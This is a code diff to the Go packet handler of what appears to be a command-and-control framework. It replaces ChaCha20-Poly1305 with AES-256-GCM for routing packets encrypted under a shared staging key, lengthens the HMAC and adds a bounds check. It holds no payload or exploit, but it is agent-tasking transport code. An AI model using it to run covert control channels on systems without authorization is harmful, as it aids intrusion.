@@ -8,26 +8,25 @@ Defines packet types, builds tasking packets and parses result packets.
 
 Packet format:
 
-ChaCha20 = encrypted with the shared staging key
-HMACs = SHA1 HMAC using the shared staging key
+AES-256-GCM = AEAD encrypted with the shared staging key
 AESc = AES encrypted using the client's session key
-HMACc = first 10 bytes of a SHA256 HMAC using the client's session key
+HMACc = first 16 bytes of a SHA256 HMAC using the client's session key
 
     Routing Packet:
-    +---------+--------------------------------+--------------------------+
-    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-    +---------+--------------------------------+--------------------------+
-    |    12   |                32              |          length          |
-    +---------+--------------------------------+--------------------------+
+    +------+---------------------------+--------------------------+
+    |  IV  | AES-256-GCM(RoutingData)  | AESc(client packet data) | ...
+    +------+---------------------------+--------------------------+
+    |  12  |             32            |          length          |
+    +------+---------------------------+--------------------------+
 
-        ChaCha20+Poly1305(RoutingData):
-        +---------------------------+---------------------------+
-        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
-        +---------------------------+---------------------------+
-        |           16              |            16             |
-        +---------------------------+---------------------------+
+        AES-256-GCM(RoutingData):
+        +------------------------+----------+
+        |  AES-GCM(Encrypted)    | GCM Tag  |
+        +------------------------+----------+
+        |          16            |    16    |
+        +------------------------+----------+
 
-            ChaCha20(RoutingData):
+            RoutingData (plaintext):
             +-----------+------+------+-------+--------+
             | SessionID | Lang | Meta | Extra | Length |
             +-----------+------+------+-------+--------+
@@ -44,7 +43,7 @@ HMACc = first 10 bytes of a SHA256 HMAC using the client's session key
     +--------+-----------------+-------+
     | AES IV | Enc Packet Data | HMACc |
     +--------+-----------------+-------+
-    |   16   |   % 16 bytes    |  10   |
+    |   16   |   % 16 bytes    |  16   |
     +--------+-----------------+-------+
 
     Client data decrypted:
@@ -75,7 +74,8 @@ import (
 	"encoding/binary"
 	"fmt"
 	"io"
-	"golang.org/x/crypto/chacha20poly1305"
+	"crypto/aes"
+	"crypto/cipher"
 )
 
 type PacketHandler struct {
@@ -108,26 +108,26 @@ func (ph PacketHandler) BuildResponsePacket(taskingID int, packetData string, re
 /*
 """
 
-	Takes the specified parameters for an "routing packet" and builds/returns
-	an HMAC'ed chacha20+poly1305'ed "routing packet".
+	Takes the specified parameters for a "routing packet" and builds/returns
+	an AES-256-GCM encrypted routing packet.
 
 	packet format:
 
 	    Routing Packet:
-	    +---------+--------------------------------+--------------------------+
-	    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-	    +---------+--------------------------------+--------------------------+
-	    |    12   |                32              |          length          |
-	    +---------+--------------------------------+--------------------------+
+	    +------+---------------------------+--------------------------+
+	    |  IV  | AES-256-GCM(RoutingData)  | AESc(client packet data) | ...
+	    +------+---------------------------+--------------------------+
+	    |  12  |             32            |          length          |
+	    +------+---------------------------+--------------------------+
 
-	        ChaCha20+Poly1305(RoutingData):
-	        +---------------------------+---------------------------+
-	        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
-	        +---------------------------+---------------------------+
-	        |           16              |            16             |
-	        +---------------------------+---------------------------+
+	        AES-256-GCM(RoutingData):
+	        +------------------------+----------+
+	        |  AES-GCM(Encrypted)    | GCM Tag  |
+	        +------------------------+----------+
+	        |          16            |    16    |
+	        +------------------------+----------+
 
-	            ChaCha20(RoutingData):
+	            RoutingData (plaintext):
 	            +-----------+------+------+-------+--------+
 	            | SessionID | Lang | Meta | Extra | Length |
 	            +-----------+------+------+-------+--------+
@@ -143,48 +143,54 @@ func (ph PacketHandler) BuildRoutingPacket(stagingKey []byte, sessionID string, 
 	binary.Write(buf, binary.LittleEndian, uint32(len(encData))) // 4 bytes - Length
 	data := buf.Bytes()
 
-	ChaChaNonce := make([]byte, 12)
-	if _, err := io.ReadFull(rand.Reader, ChaChaNonce); err != nil {
-		fmt.Println("Error generating Chacha20Poly1305 nonce:", err)
+	iv := make([]byte, 12)
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		fmt.Println("Error generating AES-GCM IV:", err)
 		return nil
 	}
 
-	cipher, err := chacha20poly1305.New(stagingKey)
+	block, err := aes.NewCipher(stagingKey)
 	if err != nil {
-		fmt.Println("Error creating ChaCha20Poly1305 cipher:", err)
+		fmt.Println("Error creating AES cipher:", err)
 		return nil
 	}
 
-	ChaCha20EncData := cipher.Seal(nil, ChaChaNonce, data, []byte{})
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fmt.Println("Error creating AES-GCM:", err)
+		return nil
+	}
 
-	packet := append(ChaChaNonce, ChaCha20EncData...)
+	aesgcmEncData := gcm.Seal(nil, iv, data, []byte{})
+
+	packet := append(iv, aesgcmEncData...)
 	packet = append(packet, encData...)
 
 	return packet
 }
 
 /*
-Decodes the chacha20+poly1305 "routing packet" and parses raw agent data into:
+Decodes the AES-256-GCM "routing packet" and parses raw agent data into:
 
 	{sessionID : (language, meta, additional, [encData]), ...}
 
 Routing packet format:
 
 	Routing Packet:
-	+---------+--------------------------------+--------------------------+
-	|  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-	+---------+--------------------------------+--------------------------+
-	|    12   |                32              |          length          |
-	+---------+--------------------------------+--------------------------+
+	+------+---------------------------+--------------------------+
+	|  IV  | AES-256-GCM(RoutingData)  | AESc(client packet data) | ...
+	+------+---------------------------+--------------------------+
+	|  12  |             32            |          length          |
+	+------+---------------------------+--------------------------+
 
-	    ChaCha20+Poly1305(RoutingData):
-	    +---------------------------+---------------------------+
-	    |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
-	    +---------------------------+---------------------------+
-	    |           16              |            16             |
-	    +---------------------------+---------------------------+
+	    AES-256-GCM(RoutingData):
+	    +------------------------+----------+
+	    |  AES-GCM(Encrypted)    | GCM Tag  |
+	    +------------------------+----------+
+	    |          16            |    16    |
+	    +------------------------+----------+
 
-	        ChaCha20(RoutingData):
+	        RoutingData (plaintext):
 	        +-----------+------+------+-------+--------+
 	        | SessionID | Lang | Meta | Extra | Length |
 	        +-----------+------+------+-------+--------+
@@ -194,37 +200,47 @@ Routing packet format:
 func (ph PacketHandler) ParseRoutingPacket(stagingKey []byte, data []byte) (map[string][]interface{}, error) {
 	results := make(map[string][]interface{})
 	offset := 0
-	nonce_length := 12
-	chacha_header_length := nonce_length + 32
+	ivLength := 12
+	aeadHeaderLength := ivLength + 32
 
-	for len(data)-offset >= chacha_header_length {
-		ChaChaNonce := data[:nonce_length]
-		cipher, err := chacha20poly1305.New(stagingKey)
+	for len(data)-offset >= aeadHeaderLength {
+		iv := data[offset : offset+ivLength]
+
+		block, err := aes.NewCipher(stagingKey)
 		if err != nil {
 			return nil, err
 		}
 
-		routing_packet, err := cipher.Open(nil, ChaChaNonce, data[nonce_length:chacha_header_length], []byte{}) // Unseals routing data
+		gcm, err := cipher.NewGCM(block)
 		if err != nil {
 			return nil, err
 		}
 
-		sessionID := string(routing_packet[:8])
-		language := routing_packet[8]
-		meta := routing_packet[9]
-		additional := binary.LittleEndian.Uint16(routing_packet[10:12])
-		length := binary.LittleEndian.Uint32(routing_packet[12:16])
+		routingPacket, err := gcm.Open(nil, iv, data[offset+ivLength:offset+aeadHeaderLength], []byte{})
+		if err != nil {
+			return nil, err
+		}
+
+		sessionID := string(routingPacket[:8])
+		language := routingPacket[8]
+		meta := routingPacket[9]
+		additional := binary.LittleEndian.Uint16(routingPacket[10:12])
+		length := binary.LittleEndian.Uint32(routingPacket[12:16])
 
 		var encData []byte
 		if length > 0 {
-			encData = data[offset+chacha_header_length : offset+chacha_header_length+int(length)] // Fetches encrypted data (not header!)
+			end := offset + aeadHeaderLength + int(length)
+			if end > len(data) {
+				return nil, fmt.Errorf("routing packet length %d exceeds available data", length)
+			}
+			encData = data[offset+aeadHeaderLength : end]
 		} else {
 			encData = nil
 		}
 
 		results[sessionID] = []interface{}{language, meta, additional, encData}
 
-		offset += chacha_header_length + int(length)
+		offset += aeadHeaderLength + int(length)
 		if offset >= len(data) {
 			break
 		}
